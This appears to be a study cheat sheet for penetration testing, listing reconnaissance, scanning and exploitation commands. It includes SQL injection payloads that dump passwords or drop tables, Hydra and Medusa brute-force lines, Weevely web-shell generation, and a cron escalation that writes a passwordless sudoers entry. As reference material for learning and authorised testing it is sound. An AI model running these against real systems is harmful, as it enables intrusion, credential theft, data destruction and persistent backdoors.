
> **Disclaimer:** I am not an expert. The below commands and utilities are based on my understanding only and therefore may contain errors. Do not use any of these commands or utilities against devices that are not yours unless permission is explicitly provided by the owner.



## Active Reconnaissance

#### nmap
Terminal command network discovery tool, particularly useful for its port scanning capabilities
`nmap -sn <ip_address>/<CIDR>`
Scans the subnet for active hosts, where the `-sn` flag resembles a no port scan
e.g. `nmap -sn 192.168.0.100/24`

`nmap -sV -p- <ip_address>`
Scans all 65535 of the target's ports (`-p-`) returning a list of open ports and their versions (`-sV`) 

`nmap -sV -sC <ip_address>`
Performs a script scan (`-sC`) of the first 1000 of the target's ports returning a list of open ports and their versions (`-sV`)



## Passive Reconnaissance (OSINT)

#### [Netcraft](https://searchdns.netcraft.com/)
Web resource that lists services running on a domain


#### nslookup
Terminal command that queries a DNS server to resolve the IP address associated with the specified domain name
`nslookup some.domain.com`


#### whois
Terminal command that lists details of the domain registrar.
A web resource is also available at [who.is](https://who.is)
`whois <ip_address>`
`whois some.domain.com`


#### host
Terminal command that performs DNS lookups, similar to nslookup command
`host <ip_address>`
`host some.domain.com`


#### dnsenum
Terminal command that performs DNS enumeration
`dnsenum <ip_address>`
`dnsenum some.domain.com`


#### theHarvester
Python script which uses OSINT such as Google and LinkedIn to find employees, emails, etc. associated with the domain. Useful for footprinting.
`theHarvester -d <domain>`
`theHarvester -d some.domain.com -l 500 -b all`


#### Shodan
[Shodan](https://www.shodan.io/) is a search engine that enumerates devices connected to the internet, including routers, webcams, medical devices, and even traffic lights. In essence, if a device is connected to the Internet, then Shodan will index it.


## Vulnerability Assessment

#### Nessus
[Nessus](https://www.tenable.com/downloads/nessus) is a vulnerability scanner that can be useful for enumerating the potential vulnerabilities of a system. Activation codes for Nessus Essentials are freely available [on their website](https://www.tenable.com/products/nessus/activation-code).


#### Exploit Databases
There are plenty of exploit databases containing known exploits for specific versions of software or network services. [Exploit Database](https://www.exploit-db.com/) is a popular resource with over 40,000 exploits. The website contains search functionality for narrowing down results and source code for every exploit can be freely downloaded.


## Exploitation

#### Burp Suite
Burp suite can be configured as a proxy listener, allowing you to intercept messages to and from a website. Of significance is the ability to intercept login request strings and fail response messages which can be leveraged using online password cracking tools such as Hydra. Furthermore, Burp Suite can be used for modifying a HTTP message and forwarding it to the web server, allowing you to hijack sessions (if a valid cookie session is provided).


#### Metasploit
Popular exploitation framework

```Kali
> msfconsole                          # initiate the metasploit framework console
> show <auxiliary/exploit/payload>    # show entire database for a specific type
> search <search_term>                # search metasploit database
> use <auxiliary/exploit/payload>     # load the metasploit module
> show options                        # show exploit parameters (e.g. host/ port)
> set <option_name> <parameter>       # set options for the exploit
> show payloads                       # shows payloads for a specific exploit
> set payload <payload_name>          # sets the payload for the exploit
> run                                 # run the exploit
> background                          # background session
> back                                # return from module to msfconsole
> sessions                            # list running sessions
> sessions -v                         # list running sessions in verbose mode
> sessions -i <session_id>            # interact with a specific session
> sessions -k <session_id>            # kill/ terminate a specific session
> sessions -K                         # kill all sessions
> sessions -c <command>               # run a command (e.g. whoami) on all sessions
> quit                                # quit the metasploit framework console
```


#### [Armitage](https://www.kali.org/tools/armitage/)
GUI that supports nmap and metasploit framework functionality.
Must first be installed with `sudo apt install armitage`
```
> /etc/init.d/postgresql start
> sudo msfdb init
> armitage
```


#### SQL Injection

**Enumerate login details for all users**
`'OR '1'='1`
`true`
`0 OR true`
`0' OR '1'='1`

**Retrieve database version, user account name, or database name**
`'OR 1=9 union select null, version() #`
`'OR 1=9 union select null, user() #`
`'OR 1=9 union select null, database() #
`
**Retrieve database table names**
`'OR 1=9 union select null, table_name from information_schema.tables #`

**Retrieve the columns names for a table in the databse**
`OR 1=9 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users' #`

**Retrieve user passwords from the 'users' table**
`'OR 1=9 union select null, concat(user,0x0a,password) from users #`

**Update table**
`'; UPDATE <table> SET <column> = <value> WHERE <row> = <value> --`
e.g.
`'; UPDATE employees SET salary = 1234567 WHERE last_name = 'Smith' --`

**Drop table**
`'; DROP TABLE <table> --`
e.g.
`'; DROP TABLE access_log --`

**Grant privileges**
`'; GRANT all ON <table> TO <user> --`


### Password cracking

#### Wordlists
A comprehensive wordlist is essential, regardless of which password cracking tool you use. Some popular choices include:
* `/usr/share/wordlists/rockyou.txt`


#### John The Ripper
Offline password cracking tool. Useful for brute forcing password hashes, shadow files, and password-protected documents.

**Crack the password hash/es within a file using the in-built wordlist**
`sudo john <file>`

**Crack the password hash/es within a file using a custom wordlist**
`sudo john <file> wordlist=<wordlist>`

**Crack the password hash/es within a file using a specific hashing algorithm**
`sudo john <file> format=<format>`

**Show the cracked passwords for a specific file**
`sudo john --show <file>`


#### Hydra
Online password cracking tool. Useful for brute forcing HTTP login pages.

**Default usage**
`hydra <username> <password> <target_ip> <service_type> "<URL>:<login_request_string>:<failed_login_string>"`

**Using a username and password wordlist**
`hydra -L <username_wordlist> -P <password_wordlist> <target_ip> <service_type> "<path>:<login_request_string>:<failed_login_string>"`

**Example usage for brute forcing every username and password permutation in users.txt and password.txt against a HTTP-POST-FORM**
`hydra -L users.txt -P password.txt 192.168.0.100 http-post-form "/login.php:username=^USER^&password=^PASS^&login=:Wrong username or password"`

**Using F= to specify a partial fail response match (Useful for long fail responses or fail responses containing a ':'**
`hydra -L users.txt -P password.txt 192.168.0.100 http-post-form "/login.php:username=^USER^&password=^PASS^&login=:F=Wrong"`


#### Medusa
Online password cracking tool. Useful for brute forcing network services.

**Using a username and password wordlist**
`medusa -h <target_ip> -U <username_wordlist> -P <password_wordlist> -M <service_type>`

**Example usage for brute forcing every username and password permutation in users.txt and password.txt against an FTP service**
`medusa -h 192.168.0.100 -U users.txt -P password.txt -M ftp`

**Example usage for brute forcing every username and password permutation in users.txt and password.txt against SSH**
`medusa -h 192.168.0.100 -U users.txt -P password.txt -M ssh`


## Post Exploitation

#### Weevely
Generates a backdoor agent. Useful for uploading to websites that have upload functionality.

**Generate a backdoor agent**
`weevely generate <password> <path>`
e.g.
`weevely generate password /home/kali/Desktop/webshell.php`

**Connect to the remote backdoor agent**
`weevely <webshell_address> <password>`
e.g.
`weevely http://192.168.0.100/upload/webshell.php password`


#### Netcat
Utility for reading and writing data across a network. Useful as a listening tool or for transferring files.

**Listen on a specific port**
`sudo nc -lp <port>`

**Listen on a specific port (verbose mode)**
`sudo nc -lvp <port>`

**Enumerate active listening ports**
`sudo netstat -tunlp`

**Transferring a file**
Listen on one host
`nc -vn -lp <port> > <file_to_be_saved>`
Send the file from the other host
`nc -vn <target_ip> <port> < <file_to_be_sent>`


#### Cron Exploitation
In Linux systems, `cron` is used to automate the execute of particular tasks (running scripts, backing up files, etc). The significance of cron for post-exploitation is that if a scheduled job contains a directory with a modifiable script, it can be overwritten to provide escalation of privileges.

**Enumerate scheduled cron jobs**
`cat /etc/crontab`

**Cron directories**
```
/etc/cron.d
/etc/cron.hourly
/etc/cron.daily
/etc/cron.weekly
/etc/cron.monthly
```

**Enumerating all files in the cron directories**
`ls -lah /etc/cron*`

**Escalating privileges through a modifiable script**
Because `cron` jobs are run with root privileges, if there are any scripts being run by crontab that are modifiable by users other than root, they can be exploited to obtain root access
```
# open the script
nano <script>

# add the below command to the script
# allowing the current user to go root without a password
# by appending them to the sudoers file in /etc/
echo "<current_user> ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# run the script
run-parts /etc/cron.<directory>
# e.g. if the script is in or referenced by cron.daily
run-parts /etc/cron.daily

# go root
sudo su
```
